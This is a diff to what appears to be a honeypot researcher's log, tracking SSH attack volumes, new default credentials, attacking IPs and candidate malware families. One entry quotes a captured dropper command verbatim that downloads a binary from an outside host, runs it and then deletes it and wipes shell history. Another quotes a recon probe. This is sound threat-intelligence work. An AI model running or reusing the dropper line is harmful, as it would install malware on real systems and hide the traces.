@@ -928,3 +928,43 @@ New credential spotted: lab123 (16 hits in period 9). Wasn't in previous pulls.
 Likely targeting lab/IoT firmware defaults. Worth tracking.
 
 22:00 UTC peak still holds (1279 attempts). 11 credential feedback loops.
+
+---
+
+### 2026-06-01 afternoon pull
+
+150.2h, 3860 attempts, 233 IPs, 1072 sessions, 265,280 commands.
+
+Period 9 (threshold=1, since 2026-05-30 12:01 Rabat):
+553 attempts, 76 IPs, 46 single-shot, 553 accepted, 264,365 commands.
+
+Family 10 hit 4x today (sessions 11eb9d2cafd4, 3f645bd7c5ba, f16b3d4aaa3c + one still running at 19:03 Rabat). Paths alternating /b/ and /s/ on same C2s. Routine at this point.
+
+Family 6 (w.sh/astats) surged: 7 hits between 13:43-15:58 Rabat, one every 5-15min. New frequency record for that family.
+
+New credential: support (36 hits, climbing). lab123 at 26. Both trending up across pulls.
+
+New feedback loops: 103.146.202.84 (42 post-accept attempts), 91.92.42.88 (10), 23.224.152.54 (10).
+
+New single-command probe (sid 79720193be3c, 138.99.79.29, password Suporte@123):
+hostname 2>/dev/null | head -1 | tr -d '\n' || cat /etc/hostname 2>/dev/null | head -1 | tr -d '\n' || echo 'N/A'
+More careful than F9 (fallback chain, strip newline for clean C2 output). Not matching any existing family. Watching for repeat.
+
+---
+
+### TODO: wowo dropper (F12 candidate) -- 2026-06-02
+
+Session d9ddf36a96 (01:53 UTC, 172.210.53.193). F7-style 35-command recon, then deploys:
+  chmod 777 /usr/bin/curl; cd /tmp; curl -O http://wowo.biz.id/wowiloveyou/runningaway.x86; chmod 777 runningaway.x86; ./runningaway.x86 vipies; rm -rf runningaway.x86; history -c
+"vipies" is likely a campaign tag. Self-deletes + wipes history. Previous F7 sessions never deployed -- not yet clear if this is F7 upgraded or a separate family with identical recon TTPs.
+TODO: check if wowo.biz.id/wowiloveyou/runningaway.x86 is still live, strings + file, decide if new family.
+
+---
+
+### TODO: gJw27HGL two-stage dropper (F13 candidate) -- 2026-06-02
+
+Two-bot pattern: 176.61.50.14 SCP-uploads /tmp/gJw27HGL, 172.210.53.193 executes it.
+Execute sessions: 517b6d0aebb3 (06:06 UTC), 30e7711a31a2 (10:02 UTC).
+SCP upload sessions: a3184ec762df (09:40 UTC) -- two attempts within 1s.
+Execute at 06:06 predates upload at 09:40 -- the two bots run independently, executor assumes binary already present. Quarantine may have captured gJw27HGL (couldn't verify, no sudo). Check quarantine before next pull.
+TODO: pull quarantine file, analyse gJw27HGL, confirm two-stage coordination or coincidence.
